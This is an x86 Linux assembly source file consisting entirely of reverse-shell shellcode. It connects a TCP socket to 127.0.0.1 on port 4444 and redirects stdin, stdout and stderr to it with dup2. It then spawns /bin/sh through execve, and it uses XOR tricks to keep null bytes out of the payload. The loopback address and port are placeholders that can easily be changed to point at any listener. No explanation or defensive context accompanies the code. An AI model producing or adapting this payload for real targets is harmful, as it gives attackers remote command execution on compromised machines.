global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    xor   eax, eax
    xor   ecx, ecx
    xor   edx, edx

    ; create sockaddr_in struct
    push  eax
    push  eax             ; [$esp]: 8 bytes of padding
    mov   eax, 0xffffffff
    mov   ebx, 0xfeffff80
    xor   ebx, eax
    push  ebx             ; [$esp]: 127.0.0.1
    push  word 0x5c11     ; [$esp]: 4444
    push  word 0x02       ; [$esp]: AF_INET

    ; call socket(domain, type, protocol)
    xor   eax, eax
    xor   ebx, ebx
    mov   ax, 0x167       ; $eax: 0x167 / 359
    mov   bl, 0x02        ; $ebx: AF_INET
    mov   cl, 0x01        ; $ecx: SOCK_STREAM
    int   0x80
    mov   ebx, eax        ; $ebx: socket file descriptor

    ; call connect(sockfd, sockaddr, socklen_t)
    mov   ax, 0x16a
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp        ; $ecx: size of the sockaddr struct
    int   0x80

    ; call dup2 to redirect STDIN, STDOUT and STDERR
    xor   ecx, ecx
    mov   cl, 0x3
    dup:
    xor   eax, eax
    mov   al, 0x3f
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
    xor   eax, eax
    xor   edx, edx
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
    mov   al, 0x0b
    int   0x80
